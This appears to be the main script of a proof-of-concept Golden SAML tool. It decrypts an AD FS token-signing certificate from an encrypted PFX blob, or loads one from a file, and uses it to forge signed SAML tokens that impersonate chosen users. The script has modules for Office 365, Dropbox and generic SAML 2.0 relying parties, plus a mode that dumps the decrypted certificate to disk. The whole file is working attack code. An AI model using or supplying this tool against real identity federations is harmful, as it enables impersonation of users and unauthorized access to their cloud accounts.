# POC for PFX
from datetime import datetime, timedelta
from argparse import ArgumentParser
from utils import random_string, encode_object_guid, die, print_intro
from EncryptedPfx import EncryptedPFX
from SamlSigner import SAMLSigner
from urllib import parse
import sys
import json
import base64

DEBUG = False


def parse_args():
    arg_parser = ArgumentParser()
    key_group = arg_parser.add_mutually_exclusive_group(required=True)
    key_group.add_argument('-b', '--blob', help='Encrypted PFX blob and decryption key', nargs=2)
    key_group.add_argument('-c', '--cert', help='AD FS Signing Certificate')
    arg_parser.add_argument('-p', '--password', help='AD FS Signing Certificate Password', default=None)
    arg_parser.add_argument('-v', '--verbose', help='Verbose Output', default=False)
    arg_parser.add_argument('--assertionid', help='AssertionID string. Defaults to a random string', default=random_string())
    arg_parser.add_argument('--responseid', help='The Response ID. Defaults to random string', default=random_string())
    arg_parser.add_argument('-s', '--server', help='Identifier for the federation service. Usually the fqdn of the server. e.g. sts.example.com DO NOT include HTTPS://')
    arg_parser.add_argument('-a', '--algorithm', help='SAML signing algorithm to use', default='rsa-sha256')
    arg_parser.add_argument('-d', '--digest', help='SAML digest algorithm to use', default='sha256')
    arg_parser.add_argument('-o', '--output', help='Write generated token to the supplied filepath')

    subparsers = arg_parser.add_subparsers(
        title='modules',
        description='loaded modules',
        help='additional help',
        dest='command'
    )

    parser_office365 = subparsers.add_parser('o365')
    parser_office365.add_argument('--upn', help='Universal Principal Name of user to spoof', required=True)
    parser_office365.add_argument('--objectguid', help='Object GUID of user to spoof. You can get this from AD', required=True),

    parser_dropbox = subparsers.add_parser('dropbox')
    parser_dropbox.add_argument('--email', help='User email address', required=True)
    parser_dropbox.add_argument('--accountname', help='SAM Account Name', required=True)

    parser_generic_saml2 = subparsers.add_parser('saml2')
    parser_generic_saml2.add_argument('--endpoint', help='The destination/recipient attribute for SAML 2.0 token. Where the SAML token will be sent.', default=None)
    parser_generic_saml2.add_argument('--nameidformat', help='The format attribute for the NameIdentifier element', default=None)
    parser_generic_saml2.add_argument('--nameid', help='The NameIdentifier attribute value', default=None)
    parser_generic_saml2.add_argument('--rpidentifier', help='The Identifier for the Relying Party', default=None)
    parser_generic_saml2.add_argument('--assertions', help='The XML assertions for the SAML token', default=None)
    parser_generic_saml2.add_argument('--config', help='JSON file containing generic args', default=None)

    parser_dump = subparsers.add_parser('dump')
    parser_dump.add_argument('--path', help='Filepath where the signing token will be output.', default='token.pfx')

    args = arg_parser.parse_args()
    if args.verbose:
        global DEBUG
        DEBUG = True

    command = args.command
    if command != 'dump':
        if not args.server:
            sys.stderr.write("If generating a token you must supply the federation service identifier with --server.\n")
            die()

        elif command and command == 'saml2':
            saml_set = frozenset([args.endpoint, args.nameidformat, args.nameid, args.rpidentifier, args.assertions])

            if not args.config and any([arg is None for arg in saml_set]):
                sys.stderr.write("If not using a config file you must specify all the other SAML 2.0 args. Quitting.\n")
                die()

    return args


def get_signer(args):
    if args.cert:
        password = bytes(args.password, 'utf-8')
        with open(args.cert, 'rb') as infile:
            pfx = infile.read()
        signer = SAMLSigner(pfx, args.command, password=password)
    else:
        pfx = EncryptedPFX(args.blob[0], args.blob[1])
        decrypted_pfx = pfx.decrypt_pfx()
        if args.command == 'dump':
            with open(args.path, 'wb') as pfx_file:
                pfx_file.write(decrypted_pfx)
            signer = None
        else:
            signer = SAMLSigner(decrypted_pfx, args.command)

    return signer


def get_module_params(command):
    now = datetime.utcnow()
    hour = timedelta(hours=1)
    five_minutes = timedelta(minutes=5)
    second = timedelta(seconds=1)
    token_created = (now).strftime('%Y-%m-%dT%H:%M:%S.000Z')
    token_expires = (now + hour).strftime('%Y-%m-%dT%H:%M:%S.000Z')
    subject_confirmation_time = (now + five_minutes).strftime('%Y-%m-%dT%H:%M:%S.000Z')
    authn_instant = (now - second).strftime('%Y-%m-%dT%H:%M:%S.500Z')

    if command == 'o365':
        immutable_id = encode_object_guid(args.objectguid).decode('ascii')

        params = {
            'TokenCreated': token_created,
            'TokenExpires': token_expires,
            'UPN': args.upn,
            'NameIdentifier': immutable_id,
            'AssertionID': args.assertionid,
            'AdfsServer': args.server
        }
        name_identifier = "AssertionID"

    elif command == 'dropbox':
        params = {
            'TokenCreated': token_created,
            'TokenExpires': token_expires,
            'EmailAddress': args.email,
            'SamAccountName': args.accountname,
            'AssertionID': args.assertionid,
            'AdfsServer': args.server,
            'SubjectConfirmationTime': subject_confirmation_time,
            'ResponseID': args.responseid,
            'AuthnInstant': authn_instant
        }
        name_identifier = "ID"

    elif command == 'saml2':
        params = {
            'TokenCreated': token_created,
            'TokenExpires': token_expires,
            'AssertionID': args.assertionid,
            'AdfsServer': args.server,
            'SubjectConfirmationTime': subject_confirmation_time,
            'ResponseID': args.responseid,
            'AuthnInstant': authn_instant
        }

        if args.config:
            with open(args.config, 'r') as config_file:
                data = config_file.read()
            try:
                saml2_params = json.loads(data)
            except json.JSONDecodeError:
                sys.stderr.write("Could not parse JSON config file for SAML2 token creation. Quitting.\n")
                die()
        else:
            saml2_params = {
                'SamlEndpoint': args.endpoint,
                'NameIDFormat': args.nameidformat,
                'NameID': args.nameid,
                'RPIdentifier': args.rpidentifier,
                'Assertions': args.assertions
            }
        params.update(saml2_params)
        name_identifier = "ID"

    return params, name_identifier


def output_token(token, command):
    if command != 'o365':
        token = base64.b64encode(token)
    token = parse.quote(token)

    return token


if __name__ == "__main__":
    print_intro()

    args = parse_args()

    signer = get_signer(args)

    if args.command != 'dump':
        params, id_attribute = get_module_params(args.command)

        token = signer.sign_XML(params, id_attribute, args.algorithm, args.digest)

        if args.output:
            with open(args.output, 'wb') as token_file:
                token_file.write(token)
        else:
            print(output_token(token, args.command))
